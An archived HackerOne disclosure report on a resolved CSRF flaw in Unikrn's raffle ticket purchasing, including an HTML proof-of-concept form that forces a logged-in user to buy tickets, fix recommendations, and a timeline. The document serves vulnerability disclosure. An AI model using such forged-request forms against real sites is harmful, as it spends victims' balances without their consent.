---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-request-forgery-csrf
  - env/web
substate: "resolved"
weakness: "Cross-Site Request Forgery (CSRF)"
enriched: true
body: true
date: 2018-04-10
submitted: 2017-09-28T04:08:10.330Z
bounty_usd: null
votes: 19
cve: []
program: "[[programs/unikrn|Unikrn]]"
reporter: "tolo7010"
source: "https://hackerone.com/reports/272588"
title: "CSRF in Raffles Ticket Purchasing"
---
# CSRF in Raffles Ticket Purchasing

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 19 | **Program:** Unikrn | **Disclosed:** 2018-04-10

- Report: [https://hackerone.com/reports/272588](https://hackerone.com/reports/272588)
- CWE: Cross-Site Request Forgery (CSRF)
- Submitted: 2017-09-28T04:08:10.330Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Description:
========

An API endpoint get executed with no CSRF prevention, the endpoint did not verify session_id required in the post form. An attacker can crafted malicious form (Poc), which is executed by authenticated user action leading to huge balance lost.

Poc:
===

<!doctype html>
<html>
<head>
</head> 
<body>
<form action="https://unikrn.com/apiv2/raffle/enter" method="POST" name="myForm">
<input type="hidden" name="raffle" id="raffle" value="4775">
<input type="hidden" name="tickets" id="tickets" value="1">
<input type="hidden" name="session_id" id="session_id" value="">
<input value="Submit" type="submit"">
</form>
</body>
</html>

Recommendations:
=============

- Implementing CSRF tokens.
- Validate session_id on post form/JSON api input.

## Timeline

- **Report Filed**
- **Report Needs More Info**
- **Report New**
- **2017-09-28** @tolo7010: I left it blank intentionally, while many endpoints raise "no_session" error if no session / invalid session specified. This endpoint ignores it, takes cookie as authentication, and the cookie get to the server when visited.
- **2017-09-30** @tolo7010: Please let me know if any updates available, thanks.

Regards.
- **Report Resolved**
- **2017-10-05** @tolo7010: the reproduction doesnot work anymore. fixed confirmed
- **Bounty Awarded**
- **2017-10-05** @tolo7010: thanks for the bounty!

Regards
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
